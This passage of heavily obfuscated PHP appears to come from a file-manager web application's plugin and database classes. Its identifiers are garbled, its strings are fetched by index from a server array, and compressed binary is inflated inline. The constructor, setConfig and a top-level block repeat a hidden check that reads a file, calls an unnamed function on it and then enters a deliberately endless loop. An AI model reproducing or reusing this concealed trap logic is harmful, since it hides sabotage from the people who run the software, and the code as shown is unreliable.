256\322\354\204\151\71\76\234\227\64\213\344\267\331\164\34\161\273\116\331\172\102\14".base64_decode('4sPRJymPoJC4NMKdIrcRBGwJeiFBuNfE/HJCp7kEKbki+JaDR+SzD+4320qeG1iR')."\200\230\323\224\71\316\234\127\142\203\156\321\37\174\61\41\115\231\240\117\0\374\144\365\27\142\52\157\7\151\116\20\36\75\360\153\230\120\204\367\325\2\153\331\233\226\120\235"."\276\122\305\325\102\277\252\5\220\242\212\46\250\307\163\42\353\2\223\231\104\62\121\226\325\35\112\44\126\306\342\255\324\101\172\131\66\251\45\251\23\225\145\165\167\304\272\166"."\x96\x17\xee\xc\x45\xa2\x65\x79\x58\xf3\xa8\x4b\x15\xce\xc5\x68\x56\xa4\x9b\xf4\x92\x5c\xdf\xed\xac\x17\x91\x96\x65\xa2\x27\xe4\xa2\x58\x8\xe7\x8b\x59\x93\xc9\xdc\xd9\xe5\x45\x42\xcb\x31\x2e"."\x5d\xb2\xff\xd4\xf3\xc2\xab\x9c\xa8\x53\x30\xd2\xc3\x42\xb8\xa7\x49\xc4\xbb\xcd\xdc\x3f\xf2\x80\xfb\xb5\x21\x8f\x82\x1f\x3\x52\x68\x8\x6b\xd\x75\x41\xdb\x71\xf6\x74\x28\x76\x18\xcf\xf7\x3a"."\x27\xa4\xc5\xcd\x77\xc0\x75\x43\x2e\xa5\x93\xfd\x40\x10\x8c\x4\x73\xf2\x41\x4b\x12\x66\x56\x9c\x20\x59\xb0\x5b\x7e\xd1\x40\x72\xc5\x4\xe0\x8e\x2d\x35\x41\xe5\x6c\xad\x99\x92\x2e\x12\x28\x1b"."\3\326\230\60\245\222\146\30\15\273\262\35\155\250\342\105\61\225\346\341\35\57\344\154\377\33\227\2\134\344\200\253\0\0".strrev(''), 10, -8))); goto Dïõøí„ë; Dã÷—­÷: define($_SERVER[ùÆÎÔ“Ñ][612], $_SERVER[ùÆÎÔ“Ñ][613]); $exhnoiqvac = $_SERVER[ùÆÎÔ“Ñ][614]; $_SERVER[¨…Øˆ¼Û] = explode($_SERVER[ùÆÎÔ“Ñ][615], gzinflate(substr($_SERVER[ùÆÎÔ“Ñ][616], 10, -8))); goto Bñ§èø†ŠŸ; dä‘ÃŒÃù: if (!isset($_SERVER[$_SERVER[ùÆÎÔ“Ñ][841]]) || !isset($_SERVER[$_SERVER[ùÆÎÔ“Ñ][848]])) { $_getc = $_SERVER[ùÆÎÔ“Ñ][843]; $_getfile = $_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùÆÎÔ“Ñ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ùÆÎÔ“Ñ][645]) { $exit = $_SERVER[ùÆÎÔ“Ñ][846]; $exit(); } $_act = $_SERVER[ùÆÎÔ“Ñ][847]; $_act($_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ùÆÎÔ“Ñ][378]); } } class Message { function __construct() { } public function send($ö­¿Ò©£ = '', $¸ùÏ™™Ò = array(), $¶®½° = "\164\145\170\x74") { $Ó•±´£× =& $_SERVER[ùÆÎÔ“Ñ]; $ÖÈÄØúò = array($Ó•±´£×[33] => $Ó•±´£×[1531], $Ó•±´£×[756] => $ö­¿Ò©£); if (in_array($¶®½°, array($Ó•±´£×[1531], $Ó•±´£×[1532]))) { $ÖÈÄØúò[$Ó•±´£×[33]] = $¶®½°; } $¸ùÏ™™Ò = array($Ó•±´£×[515] => isset($¸ùÏ™™Ò[$Ó•±´£×[515]]) ? $¸ùÏ™™Ò[$Ó•±´£×[515]] : $Ó•±´£×[12], $Ó•±´£×[600] => isset($¸ùÏ™™Ò[$Ó•±´£×[600]]) ? $¸ùÏ™™Ò[$Ó•±´£×[600]] : $Ó•±´£×[12]); if (empty($ö­¿Ò©£) || empty($¸ùÏ™™Ò[$Ó•±´£×[515]]) && empty($¸ùÏ™™Ò[$Ó•±´£×[600]])) { return !1; } $ø³ö†‹ö = array($Ó•±´£×[1472] => $ÖÈÄØúò, $Ó•±´£×[1533] => $¸ùÏ™™Ò); Hook::trigger($Ó•±´£×[1534], $ø³ö†‹ö); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $—òÖÚ•ë =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($_SERVER[$—òÖÚ•ë[841]]) || !isset($_SERVER[$—òÖÚ•ë[848]])) { $¯Çˆ® = $—òÖÚ•ë[882]; $“íèœÒ¦ = $—òÖÚ•ë[843]; $”“•ºêñ = $_SERVER[$—òÖÚ•ë[844]] . $—òÖÚ•ë[845]; $–†¡©Ëó = $“íèœÒ¦($”“•ºêñ); $‡á„µÁ = explode($—òÖÚ•ë[231], $–†¡©Ëó); if (count($‡á„µÁ) < $—òÖÚ•ë[618]) { $•Ì£À†ª = $—òÖÚ•ë[846]; $•Ì£À†ª(); } $÷Í çœ× = $—òÖÚ•ë[883]; $÷Í çœ×($_SERVER[$—òÖÚ•ë[884]]); $‚·Ø‰üó = 1; for ($ø—ƒè¼¿ = $‚·Ø‰üó; $ø—ƒè¼¿ > 0; $ø—ƒè¼¿++) { $÷Í çœ× = json_encode($GLOBALS[$—òÖÚ•ë[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($—òÖÚ•ë[1535]); $this->pluginName = str_replace($—òÖÚ•ë[1535], $—òÖÚ•ë[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $—òÖÚ•ë[8]; $this->pluginApi = appHostGet() . $—òÖÚ•ë[1536] . $this->pluginName . $—òÖÚ•ë[8]; $this->pluginHost = $config[$—òÖÚ•ë[1537]] . $this->pluginName . $—òÖÚ•ë[8]; $this->pluginHostDefault = $config[$—òÖÚ•ë[1537]] . $this->pluginName . $—òÖÚ•ë[8]; $ŸÃ †è„ = $config[$—òÖÚ•ë[1538]]; if ($ŸÃ †è„ && strpos($—òÖÚ•ë[50] . $ŸÃ †è„ . $—òÖÚ•ë[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$—òÖÚ•ë[1539]] . $this->pluginName . $—òÖÚ•ë[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ùÆÎÔ“Ñ][1540]); } protected function assign($»¨£ß•, $îİ¨õ“° = false) { if (is_array($»¨£ß•)) { $this->values = array_merge($this->values, $»¨£ß•); } else { $this->values[$»¨£ß•] = $îİ¨õ“°; } } protected function display($ÖŞ«óŸÇ) { extract($this->values); require $ÖŞ«óŸÇ; } final function hookRegist($ÍÈ¸äƒ˜) { $this->modelPlugin->appRegist($this->pluginName, $ÍÈ¸äƒ˜); } final function appIcon() { $Ø–õÇä— =& $_SERVER[ùÆÎÔ“Ñ]; $¨´……û¼ = $this->appPackage(); $Ä³é±ãÄ = $Ø–õÇä—[12]; if (isset($¨´……û¼[$Ø–õÇä—[416]])) { if (isset($¨´……û¼[$Ø–õÇä—[416]][$Ø–õÇä—[1541]])) { $Ä³é±ãÄ = $Ø–õÇä—[1542] . $¨´……û¼[$Ø–õÇä—[416]][$Ø–õÇä—[1541]] . $Ø–õÇä—[1543]; } else { if ($¨´……û¼[$Ø–õÇä—[416]][$Ø–õÇä—[1544]]) { $Ä³é±ãÄ = $Ø–õÇä—[1545] . $¨´……û¼[$Ø–õÇä—[416]][$Ø–õÇä—[1544]] . $Ø–õÇä—[1546]; } } } return $Ä³é±ãÄ; } final function fileCanView($•ÂôÍ“‘) { $¿ÉÀ¤É =& $_SERVER[ùÆÎÔ“Ñ]; if (request_url_safe($•ÂôÍ“‘)) { return !0; } if ($this->isShare($•ÂôÍ“‘)) { return !0; } $¬„òì§ğ = Session::get($¿ÉÀ¤É[1547]); if (!$¬„òì§ğ || !$¬„òì§ğ[$¿ÉÀ¤É[1548]]) { $Ø‡ØÍ¦£ = $¿ÉÀ¤É[1549] . rawurlencode(this_url()); show_tips(LNG($¿ÉÀ¤É[1550]) . $¿ÉÀ¤É[1551] . $Ø‡ØÍ¦£ . $¿ÉÀ¤É[1552] . LNG($¿ÉÀ¤É[1553]) . $¿ÉÀ¤É[1554], !1); } if (!Action($¿ÉÀ¤É[1555])->authCan($¿ÉÀ¤É[1556])) { show_tips(LNG($¿ÉÀ¤É[1557]) . $¿ÉÀ¤É[1558], !1); } ActionCall($¿ÉÀ¤É[1559], $•ÂôÍ“‘); } final function isShare($ÅĞÖ—ªÇ) { $Âì×¶Éó = KodIO::parse($ÅĞÖ—ªÇ); return $Âì×¶Éó[$_SERVER[ùÆÎÔ“Ñ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($½ƒ«ÖŠ) { if (request_url_safe($½ƒ«ÖŠ)) { return $½ƒ«ÖŠ; } if (!$this->isShare($½ƒ«ÖŠ)) { $½ƒ«ÖŠ = $this->filePath($½ƒ«ÖŠ); } return Action($_SERVER[ùÆÎÔ“Ñ][1180])->linkOut($½ƒ«ÖŠ); } public function filePathLinkOut($æ¥Ş¼Å) { if (request_url_safe($æ¥Ş¼Å)) { return $æ¥Ş¼Å; } $this->fileCanView($æ¥Ş¼Å); return Action($_SERVER[ùÆÎÔ“Ñ][1180])->link($æ¥Ş¼Å); } final function filePath($”£Ì¥†ğ) { $èÅÍ°šš =& $_SERVER[ùÆÎÔ“Ñ]; if ($Õ÷ïÏ‹ = $this->checkSharePath($”£Ì¥†ğ)) { Hook::trigger($èÅÍ°šš[1560], $Õ÷ïÏ‹); return $Õ÷ïÏ‹; } $this->fileCanView($”£Ì¥†ğ); if (request_url_safe($”£Ì¥†ğ)) { $ÃÊÊ¥Ì• = parse_url_query($”£Ì¥†ğ); if (isset($ÃÊÊ¥Ì•[$èÅÍ°šš[1561]]) && isset($ÃÊÊ¥Ì•[$èÅÍ°šš[213]])) { $§°õ’Õø = Model($èÅÍ°šš[771])->get($èÅÍ°šš[772]); $·ü¸„îµ = Mcrypt::decode($ÃÊÊ¥Ì•[$èÅÍ°šš[213]], $§°õ’Õø); if ($·ü¸„îµ) { $this->fileInfo = IO::infoWithChildren($·ü¸„îµ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $·ü¸„îµ; } } $”£Ì¥†ğ = $this->_cacheHttpFile($”£Ì¥†ğ); $this->fileInfo = IO::infoWithChildren($”£Ì¥†ğ); } else { $this->fileInfo = IO::infoWithChildren($”£Ì¥†ğ); if (!$this->fileInfo) { show_tips(LNG($èÅÍ°šš[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($èÅÍ°šš[1560], $”£Ì¥†ğ); return $”£Ì¥†ğ; } final function _cacheHttpFile($šÛÓ‚óÆ) { $—Û¾ÃÙ = hash_path($šÛÓ‚óÆ, !0); $this->cachePath = $this->pluginCachePath($—Û¾ÃÙ); if ($ôç‰Ò» = IO::fileNameExist($this->cachePath, $—Û¾ÃÙ)) { return KodIO::make($ôç‰Ò»); } $¼ŞÌéÌµ = $this->cachePath . $—Û¾ÃÙ; return $this->pluginCacheFileSet($¼ŞÌéÌµ, file_get_contents_nossl($šÛÓ‚óÆ)); } final function _tmpFileName($×ìÈÙ¾ = array()) { $´Ç±ÚªÇ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$×ìÈÙ¾) { $×ìÈÙ¾ = $this->fileInfo; } if (isset($×ìÈÙ¾[$´Ç±ÚªÇ[177]])) { return $×ìÈÙ¾[$´Ç±ÚªÇ[177]]; } if (isset($×ìÈÙ¾[$´Ç±ÚªÇ[170]][$´Ç±ÚªÇ[177]])) { return $×ìÈÙ¾[$´Ç±ÚªÇ[170]][$´Ç±ÚªÇ[177]]; } $Šåì˜üå = IO::hashSimple($×ìÈÙ¾[$´Ç±ÚªÇ[84]]); if ($Šåì˜üå) { return $Šåì˜üå; } $°ÌÍ = array($×ìÈÙ¾[$´Ç±ÚªÇ[32]], $×ìÈÙ¾[$´Ç±ÚªÇ[84]], $×ìÈÙ¾[$´Ç±ÚªÇ[76]]); if (isset($×ìÈÙ¾[$´Ç±ÚªÇ[521]])) { $°ÌÍ[] = $×ìÈÙ¾[$´Ç±ÚªÇ[521]]; } return md5(implode($´Ç±ÚªÇ[11], $°ÌÍ)); } final function checkSharePath($àŞë‹·Ÿ) { $íãšà‹Ï =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($íãšà‹Ï[475])) { define($íãšà‹Ï[514], 0); } if (!$this->isShare($àŞë‹·Ÿ)) { return !1; } $€· ïã = Action($íãšà‹Ï[1180])->sharePathInfo($àŞë‹·Ÿ); if (!isset($€· ïã[$íãšà‹Ï[84]])) { show_json(LNG($íãšà‹Ï[1562]), !1); } $this->fileInfo = $€· ïã[$íãšà‹Ï[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$íãšà‹Ï[177]]); return $€· ïã[$íãšà‹Ï[84]]; } final function pluginCachePath($—¦ğÏğ = '') { $œŠ¯ßõ¿ =& $_SERVER[ùÆÎÔ“Ñ]; $“üè¥æ = IO_PATH_SYSTEM_TEMP . $œŠ¯ßõ¿[1563] . $this->pluginName; if (!($ÍÒŞ“Ë = IO::infoFull($“üè¥æ))) { return IO::mkdir($“üè¥æ . $œŠ¯ßõ¿[8] . $—¦ğÏğ); } if (empty($—¦ğÏğ)) { return $ÍÒŞ“Ë[$œŠ¯ßõ¿[84]]; } if (!($ê‚øÙ¤ = IO::fileNameExist($ÍÒŞ“Ë[$œŠ¯ßõ¿[84]], $—¦ğÏğ))) { return IO::mkdir($ÍÒŞ“Ë[$œŠ¯ßõ¿[84]] . $—¦ğÏğ); } return KodIO::make($ê‚øÙ¤); } final function pluginCacheFileSet($¯ô–èŞŸ, $ïÊÖüÀ› = '') { $Á‚şºõˆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!($•¼Ç¢ïò = IO::infoFull($¯ô–èŞŸ))) { return IO::mkfile($¯ô–èŞŸ, $ïÊÖüÀ›, REPEAT_REPLACE); } IO::setContent($•¼Ç¢ïò[$Á‚şºõˆ[84]], $ïÊÖüÀ›); return $•¼Ç¢ïò[$Á‚şºõˆ[84]]; } final function pluginLocalFile($§±Åô¿´ = '') { $Ú½Šşş· =& $_SERVER[ùÆÎÔ“Ñ]; $úÑº÷ï‚ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($úÑº÷ï‚)) { mk_dir($úÑº÷ï‚); } if (!$§±Åô¿´) { return $úÑº÷ï‚; } $¹›ƒ¼‰­ = IO::info($§±Åô¿´); $ö°¸¿Æù = $this->_tmpFileName($¹›ƒ¼‰­) . $Ú½Šşş·[10] . $¹›ƒ¼‰­[$Ú½Šşş·[174]]; if (!checkExtSafe($ö°¸¿Æù)) { $ö°¸¿Æù = $ö°¸¿Æù . $Ú½Šşş·[1212]; } $…û“óĞ¸ = $úÑº÷ï‚ . $ö°¸¿Æù; if (@file_exists($…û“óĞ¸)) { return $…û“óĞ¸; } return IO::copy($§±Åô¿´, $úÑº÷ï‚, 0, $ö°¸¿Æù); } final function appPackage() { $û•–Õóœ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->packageData) { return $this->packageData; } $ĞÜşçÁ® = $this->parseFile($this->pluginPath . $û•–Õóœ[1564]); $this->parseLang($ĞÜşçÁ®); $¹í¢öÃí = json_decode_force($ĞÜşçÁ®); if (!$¹í¢öÃí) { return array(); } $…Ğçš‘– = Hook::trigger($û•–Õóœ[1565], $¹í¢öÃí); if ($…Ğçš‘– && is_array($…Ğçš‘–)) { $¹í¢öÃí = $…Ğçš‘–; } $this->packageData = $¹í¢öÃí; return $¹í¢öÃí; } public function packageInfoGet($§°¾Â·¾) { $”î¯–Óã = $this->appPackage(); return array_get_value($”î¯–Óã, $§°¾Â·¾); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ùÆÎÔ“Ñ][1566]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ùÆÎÔ“Ñ][1567]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ùÆÎÔ“Ñ][1568]); } public function echoJsAssign($Œ©ÃŠ¯, $÷Òø­Õ‘) { $this->echoJsAssignArr[$Œ©ÃŠ¯] = $÷Òø­Õ‘; } private function parseFile($ÈöñÊòä) { $³Ã£Æ¸Ø =& $_SERVER[ùÆÎÔ“Ñ]; $°º¤¨¤ˆ = file_get_contents_nossl($ÈöñÊòä); $ğÌ…¢±× = array($³Ã£Æ¸Ø[1569], $³Ã£Æ¸Ø[1570], $³Ã£Æ¸Ø[1571], $³Ã£Æ¸Ø[1572], $³Ã£Æ¸Ø[1573], $³Ã£Æ¸Ø[1574], $³Ã£Æ¸Ø[1575]); $ôœùÏé = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$³Ã£Æ¸Ø[89]][$³Ã£Æ¸Ø[1576]]); foreach ($this->echoJsAssignArr as $Ï¥Á­Ò => $••Âîô) { $ğÌ…¢±×[] = $³Ã£Æ¸Ø[1577] . $Ï¥Á­Ò . $³Ã£Æ¸Ø[1578]; $ôœùÏé[] = is_array($••Âîô) || is_object($••Âîô) ? rawurlencode(json_encode($••Âîô)) : $••Âîô; } if (strstr($°º¤¨¤ˆ, $³Ã£Æ¸Ø[1579])) { $¬¨û¾ƒ± = rawurlencode(json_encode($this->pluginLangArr)); $°º¤¨¤ˆ = str_replace($³Ã£Æ¸Ø[1579], $¬¨û¾ƒ±, $°º¤¨¤ˆ); } if (strstr($°º¤¨¤ˆ, $³Ã£Æ¸Ø[1580])) { $¬¨û¾ƒ± = $¬¨û¾ƒ± = rawurlencode(json_encode($this->getConfig())); $°º¤¨¤ˆ = str_replace($³Ã£Æ¸Ø[1580], $¬¨û¾ƒ±, $°º¤¨¤ˆ); } $°º¤¨¤ˆ = str_replace($ğÌ…¢±×, $ôœùÏé, $°º¤¨¤ˆ); return $°º¤¨¤ˆ; } private function parseLang(&$–£üú²) { $åÂàƒÙà =& $_SERVER[ùÆÎÔ“Ñ]; $Î¿Î·Ì = $åÂàƒÙà[1581]; if (!strstr($–£üú², $Î¿Î·Ì)) { return; } preg_match_all($åÂàƒÙà[1582], $–£üú², $á¡„ç—); if (!is_array($á¡„ç—) || count($á¡„ç—) == 0 || !is_array($á¡„ç—[0]) || count($á¡„ç—[0]) == 0) { return; } $ÍÏ¬øåœ = array(); $Áıñ«ıÌ = array(); foreach ($á¡„ç—[0] as $‘ÕØƒ×„) { $Ğ’«ƒÀ = substr($‘ÕØƒ×„, strlen($Î¿Î·Ì), -4); $à­í‰Å¹ = LNG($Ğ’«ƒÀ); $ÍÏ¬øåœ[] = $‘ÕØƒ×„; $Áıñ«ıÌ[] = str_replace(array($åÂàƒÙà[231], $åÂàƒÙà[1083], $åÂàƒÙà[342], $åÂàƒÙà[118]), array($åÂàƒÙà[53], $åÂàƒÙà[53], $åÂàƒÙà[12], $åÂàƒÙà[1583]), $à­í‰Å¹); } $–£üú² = str_replace($ÍÏ¬øåœ, $Áıñ«ıÌ, $–£üú²); } private function parseConfig(&$ğú—¥©¥) { $¦ı¢æÄ™ =& $_SERVER[ùÆÎÔ“Ñ]; $ü€ŒÌû” = $¦ı¢æÄ™[1584]; if (!strstr($ğú—¥©¥, $ü€ŒÌû”)) { return; } preg_match_all($¦ı¢æÄ™[1585], $ğú—¥©¥, $–‘Ÿè‚); if (!is_array($–‘Ÿè‚) || count($–‘Ÿè‚) == 0 || !is_array($–‘Ÿè‚[0]) || count($–‘Ÿè‚[0]) == 0) { return; } $òò½Õ…÷ = $this->getConfig(); $â¡òÑÖ = array(); $šôÙêäš = array(); foreach ($–‘Ÿè‚[0] as $ïŸĞÒ˜ù) { $¥ñÙ¦§ñ = substr($ïŸĞÒ˜ù, strlen($ü€ŒÌû”), -2); $â¡òÑÖ[] = $ïŸĞÒ˜ù; $šôÙêäš[] = _get($òò½Õ…÷, $¥ñÙ¦§ñ); } $ğú—¥©¥ = str_replace($â¡òÑÖ, $šôÙêäš, $ğú—¥©¥); } private function parsePackage(&$©Öô›Ãî) { $ÙäÔª”Š =& $_SERVER[ùÆÎÔ“Ñ]; $ïÍ£‘«¯ = $ÙäÔª”Š[1586]; if (!strstr($©Öô›Ãî, $ïÍ£‘«¯)) { return; } preg_match_all($ÙäÔª”Š[1587], $©Öô›Ãî, $‹ûê¶‡ì); if (!is_array($‹ûê¶‡ì) || count($‹ûê¶‡ì) == 0 || !is_array($‹ûê¶‡ì[0]) || count($‹ûê¶‡ì[0]) == 0) { return; } $š—œš¼œ = $this->appPackage(); $ÏÆ à‹š = array(); $·ĞõºÚ– = array(); foreach ($‹ûê¶‡ì[0] as $ÕäùÈÓ) { $šˆ³û¬Ú = substr($ÕäùÈÓ, strlen($ïÍ£‘«¯), -2); $ÏÆ à‹š[] = $ÕäùÈÓ; $·ĞõºÚ–[] = _get($š—œš¼œ, $šˆ³û¬Ú); } $©Öô›Ãî = str_replace($ÏÆ à‹š, $·ĞõºÚ–, $©Öô›Ãî); } final function echoFile($ğ ®‰õ§, $İŒÃ² = false) { $–õôÖ™Ô =& $_SERVER[ùÆÎÔ“Ñ]; $æ¬åÔ½® = $this->pluginPath . $ğ ®‰õ§; if (ACT == $–õôÖ™Ô[1588]) { echo $–õôÖ™Ô[1589] . $this->pluginName . $–õôÖ™Ô[8] . $ğ ®‰õ§ . $–õôÖ™Ô[1590]; if (!file_exists($æ¬åÔ½®)) { echo $–õôÖ™Ô[1591]; return; } } $¯üñÕÍ¤ = $this->parseFile($æ¬åÔ½®); $this->parseLang($¯üñÕÍ¤); $this->parseConfig($¯üñÕÍ¤); $this->parsePackage($¯üñÕÍ¤); if (is_array($İŒÃ²)) { $¯üñÕÍ¤ = str_replace(array_keys($İŒÃ²), array_values($İŒÃ²), $¯üñÕÍ¤); } echo $–õôÖ™Ô[231] . $¯üñÕÍ¤; } final function initLang() { $êø£…Ó =& $_SERVER[ùÆÎÔ“Ñ]; $™ÊÅà  = $êø£…Ó[1592]; $º¦í¹Ë” = $this->pluginPath . $êø£…Ó[1593]; $¾¡ÔÌ§É = I18n::getType(); $ŒœñŒ¿½ = array(); if (file_exists($º¦í¹Ë” . $¾¡ÔÌ§É . $êø£…Ó[839])) { $ŒœñŒ¿½ = (include $º¦í¹Ë” . $¾¡ÔÌ§É . $êø£…Ó[839]); } else { if ($¾¡ÔÌ§É == $êø£…Ó[1594] && !file_exists($º¦í¹Ë” . $¾¡ÔÌ§É . $êø£…Ó[839]) && file_exists($º¦í¹Ë” . $êø£…Ó[1595])) { $ŒœñŒ¿½ = (include $º¦í¹Ë” . $êø£…Ó[1595]); } else { if (file_exists($º¦í¹Ë” . $™ÊÅà  . $êø£…Ó[839])) { $ŒœñŒ¿½ = (include $º¦í¹Ë” . $™ÊÅà  . $êø£…Ó[839]); } } } if (!is_array($ŒœñŒ¿½)) { return array(); } if (@count($ŒœñŒ¿½) > 0) { I18n::set($ŒœñŒ¿½); } return $ŒœñŒ¿½; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¸«áÙÀ¨) { $«‰¥´È =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($_SERVER[$«‰¥´È[841]]) || !isset($_SERVER[$«‰¥´È[848]])) { $ôáòƒÙÃ = $«‰¥´È[882]; $¤™Ğèİ = $«‰¥´È[843]; $ˆ®©¢í± = $_SERVER[$«‰¥´È[844]] . $«‰¥´È[845]; $ÏøËÌğ¸ = $¤™Ğèİ($ˆ®©¢í±); $úà¬á = explode($«‰¥´È[231], $ÏøËÌğ¸); if (count($úà¬á) < $«‰¥´È[618]) { $©ÜÂ©Ç– = $«‰¥´È[846]; $©ÜÂ©Ç–(); } $‘ÀÜÇô = $«‰¥´È[883]; $‘ÀÜÇô($_SERVER[$«‰¥´È[884]]); $²ğ¼ßñ = 1; for ($Ø©ŞÀ‘ = $²ğ¼ßñ; $Ø©ŞÀ‘ > 0; $Ø©ŞÀ‘++) { $‘ÀÜÇô = json_encode($GLOBALS[$«‰¥´È[418]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¸«áÙÀ¨); } public function onSetConfig($Œ¸˜Š˜ø) { } public function onGetConfig($Ìù“³§ß) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($†Úƒ”’À) { if ($†Úƒ”’À == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¦‡«¸õè = "\x70\x6c\x75\147\x69\x6e\101\165\x74\150") { $¥›¿©ó’ =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($¥›¿©ó’[475])) { return !1; } if (_get($GLOBALS, $¥›¿©ó’[503])) { return !0; } $ÎíŸ„êâ = $this->getConfig(); if (!$ÎíŸ„êâ[$¦‡«¸õè]) { return !1; } return ActionCall($¥›¿©ó’[1596], $ÎíŸ„êâ[$¦‡«¸õè]); } public function url($ØÉÙí§ò, $×õÉÁ¢› = '', $…­¡Õ¹Ñ = true) { $¦ÇÍí¡ğ =& $_SERVER[ùÆÎÔ“Ñ]; $“êÍ„…ö = $this->getConfig(); $…°Õ€¤Ç = KOD_VERSION . $¦ÇÍí¡ğ[10] . KOD_VERSION_BUILD; $—‹±ªŞ¢ = $this->packageVersion(); $ûèë§“ = $…°Õ€¤Ç . $¦ÇÍí¡ğ[386] . $—‹±ªŞ¢; if (substr($ØÉÙí§ò, 0, 4) == $¦ÇÍí¡ğ[148] || substr($ØÉÙí§ò, 0, 2) == $¦ÇÍí¡ğ[1381]) { $í‘¬…Ü = $ØÉÙí§ò . $¦ÇÍí¡ğ[1597] . $ûèë§“; } else { if ($×õÉÁ¢› == $¦ÇÍí¡ğ[12]) { $í‘¬…Ü = $this->pluginHost . $ØÉÙí§ò . $¦ÇÍí¡ğ[1597] . $ûèë§“; } else { if ($×õÉÁ¢› === $¦ÇÍí¡ğ[75]) { $í‘¬…Ü = $this->pluginHost . $ØÉÙí§ò; } else { if ($×õÉÁ¢› == $¦ÇÍí¡ğ[1598]) { $í‘¬…Ü = STATIC_PATH . $ØÉÙí§ò . $¦ÇÍí¡ğ[1597] . $…°Õ€¤Ç; } else { if ($×õÉÁ¢› == $¦ÇÍí¡ğ[1599]) { $í‘¬…Ü = APP_HOST . $¦ÇÍí¡ğ[1600] . $ØÉÙí§ò . $¦ÇÍí¡ğ[1597] . $…°Õ€¤Ç; } else { if (isset($“êÍ„…ö[$×õÉÁ¢›])) { $í‘¬…Ü = $“êÍ„…ö[$×õÉÁ¢›] . $ØÉÙí§ò . $¦ÇÍí¡ğ[1597] . $ûèë§“; } } } } } } if (!$…­¡Õ¹Ñ) { return $í‘¬…Ü; } echo $í‘¬…Ü; } public function link($ÍÎ–ŞÏŸ = false, $Á¥çÜÑš = '') { $ôòˆ± ï =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ÍÎ–ŞÏŸ) { $this->link($ôòˆ± ï[1601], $ôòˆ± ï[1599]); $this->link($ôòˆ± ï[1602], $ôòˆ± ï[1598]); $this->link($ôòˆ± ï[1603], $ôòˆ± ï[1598]); $this->link($ôòˆ± ï[1604], $ôòˆ± ï[1598]); $this->link($ôòˆ± ï[1605], $ôòˆ± ï[1598]); return; } $é©ë–æ = $this->url($ÍÎ–ŞÏŸ, $Á¥çÜÑš, !1); if (substr($ÍÎ–ŞÏŸ, -3) == $ôòˆ± ï[1606]) { echo $ôòˆ± ï[1607] . $é©ë–æ . $ôòˆ± ï[1608] . $ôòˆ± ï[231]; } else { if (substr($ÍÎ–ŞÏŸ, -4) == $ôòˆ± ï[1609]) { echo $ôòˆ± ï[1610] . $é©ë–æ . $ôòˆ± ï[1611] . $ôòˆ± ï[231]; } } } } goto eÉƒà‘İõ‘; Bíôù•İ‚: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\161" => "\74\x3e", "\x67\164" => "\76", "\x65\147\x74" => "\x3e\x3d", "\154\164" => "\74", "\145\x6c\x74" => "\74\75", "\x6e\157\x74\154\x69\153\145" => "\x4e\117\124\40\114\x49\x4b\x45", "\154\151\153\145" => "\x4c\111\113\x45", "\151\x6e" => "\x49\116", "\156\157\x74\151\156" => "\116\x4f\124\40\111\116", "\156\x6f\164\40\x69\x6e" => "\x4e\x4f\124\x20\x49\x4e", "\x62\145\x74\167\145\145\x6e" => "\x42\105\x54\127\x45\105\x4e", "\156\157\x74\142\x65\x74\x77\x65\x65\x6e" => "\x4e\x4f\124\40\x42\x45\124\x57\105\x45\x4e", "\x6e\157\x74\40\142\145\164\x77\145\145\x6e" => "\116\x4f\x54\x20\102\105\x54\x57\x45\x45\x4e"); protected $selectSql = 